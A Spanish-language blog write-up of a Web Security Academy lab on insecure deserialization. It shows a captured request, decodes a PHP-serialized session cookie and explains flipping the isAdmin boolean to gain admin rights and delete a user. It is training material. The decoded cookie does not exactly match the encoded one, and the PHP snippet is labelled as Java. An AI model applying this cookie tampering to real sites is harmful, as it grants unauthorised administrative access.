---
layout: post
author: kryraj
---

¡Primer laboratorio de insecure deserialization! Llamado "Lab: Modifying serialized objects"
Nuestro objetivo es eliminar a carlos. 

```
wiener:peter
```

Lo primero que haremos nada más inicar sesión es cambiar el correo para pasar la petición por Burp Suite.


```
POST /my-account/change-email HTTP/2
Host: 0ae7009903886dad801c71a800d2003f.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Origin: https://0ae7009903886dad801c71a800d2003f.web-security-academy.net
Referer: https://0ae7009903886dad801c71a800d2003f.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

email=kry%40hacking.com
```
Ahora, si decodificamos la cookie completamente, nos quedará algo similar a esto.
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:7:"isAdmin";b:0;}
```

A medida que pasan las publicaciones de este tipo de vulnerabilidad, entenderemos qué significa cada cosa. Pero lo más importante es ahora mismo.

```
b:0
```

Esto es un booleano en serialización y el 0 al significar falso y el 1 al significar verdadero. Ahora, si ponemos b:1, seremos admin ¡Y eliminaremos a Carlos!

Por cierto, para entender más, esta es la forma para detectar si eres admin o no.
```java
$user = unserialize($_COOKIE);
if ($user->isAdmin === true) {
// allow access to admin interface
}
```
